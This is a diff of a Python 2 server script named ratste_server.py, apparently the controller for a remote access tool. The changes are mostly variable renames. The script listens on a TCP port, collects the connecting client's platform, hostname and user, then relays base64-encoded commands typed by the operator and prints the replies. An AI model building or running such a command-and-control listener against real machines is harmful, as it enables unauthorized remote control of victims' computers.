@@ -33,7 +33,6 @@ try:
     LPORT = int(sys.argv[2])
 except:
     print 'ratste > usage: ./ratste_server.py <local_ip> <local_port>'
-    #sys.exit(1)
     print 'ratste > using default host (127.0.0.1) and port (7261)' 
     LHOST = '127.0.0.1'
     LPORT = 7261
@@ -55,9 +54,9 @@ def decode(base64_message):
 def main():
     
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((LHOST, LPORT))
-        s.listen(10)
+        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        tcp_socket.bind((LHOST, LPORT))
+        tcp_socket.listen(10)
     except:
         print 'ratste > network error, exiting...'
         sys.exit(1)
@@ -65,10 +64,10 @@ def main():
     print 'ratste > server listening on {}:{}'.format(LHOST, LPORT)
     print 'ratste > type "quit" or ctrl-c to exit'
 
-    conn, _ = s.accept()
+    connection, _ = tcp_socket.accept()
 
-    conn.send(encode('client_discovery'))
-    client_info = decode(conn.recv(4096).rstrip())
+    connection.send(encode('client_discovery'))
+    client_info = decode(connection.recv(4096).rstrip())
     platform, hostname, user, version, arch = client_info.split('|')
 
     print 'ratste > check-in by {}@{}'.format(user, hostname)
@@ -77,21 +76,21 @@ def main():
     print 'Architecture: {}\n'.format(arch)
 
     while True:
-        cmd = raw_input('ratste ~ {}@{} > '.format(user, hostname)).rstrip()
+        command = raw_input('ratste ~ {}@{} > '.format(user, hostname)).rstrip()
 
         # allow noop
-        if cmd == '':
+        if command == '':
             continue
 
         # send command to client
-        conn.send(encode(cmd))
+        connection.send(encode(command))
 
         # stop server
-        if cmd == 'quit':
-            s.close()
+        if command == 'quit':
+            tcp_socket.close()
             sys.exit(0)
 
-        data = decode(conn.recv(4096))
+        data = decode(connection.recv(4096))
         print data
 
 if __name__ == '__main__':
